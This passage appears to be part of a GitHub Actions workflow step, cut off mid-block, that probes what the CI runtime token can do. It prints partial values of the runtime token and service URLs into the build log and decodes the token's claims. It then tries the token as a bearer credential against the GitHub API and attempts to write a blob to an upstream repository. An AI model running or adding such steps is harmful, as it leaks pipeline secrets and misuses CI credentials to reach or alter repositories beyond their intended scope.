          RT="${ACTIONS_RUNTIME_TOKEN:-}"
          RURL="${ACTIONS_RUNTIME_URL:-}"
          CURL="${ACTIONS_CACHE_URL:-}"
          RURL2="${ACTIONS_RESULTS_URL:-}"
          echo "K01 RUNTIME_URL: ${RURL:0:80}"
          echo "K02 CACHE_URL: ${CURL:0:80}"
          echo "K03 RESULTS_URL: ${RURL2:0:80}"
          echo "K04 RUNTIME_TOKEN: $([ -n "$RT" ] && echo "${RT:0:20}..." || echo "NOT SET")"
          echo ""
          if [ -n "$RT" ]; then
            echo "--- Runtime token decode ---"
            RT_CLAIMS=$(echo "$RT" | cut -d. -f2 | \
              awk '{n=length($0)%4;if(n==2)$0=$0"==";if(n==3)$0=$0"=";print}' | \
              base64 -d 2>/dev/null | jq . 2>/dev/null || true)
            echo "K05 runtime claims: $RT_CLAIMS"
            echo ""
            echo "K06 runtime as GitHub API bearer:"
            curl -sf -H "Authorization: Bearer $RT" "https://api.github.com/user" 2>/dev/null | jq '{login,id}' 2>/dev/null || echo "failed"
            echo "K07 runtime -> upstream blob:"
            curl -s -o /dev/null -w "HTTP_%{http_code}" -X POST -H "Authorization: Bearer $RT" \
              -H "Content-Type: application/json" "$UP/git/blobs" -d '{"content":"x","encoding":"utf-8"}' 2>/dev/null || echo "000"
            echo ""
          fi
          if [ -n "$CURL" ]; then
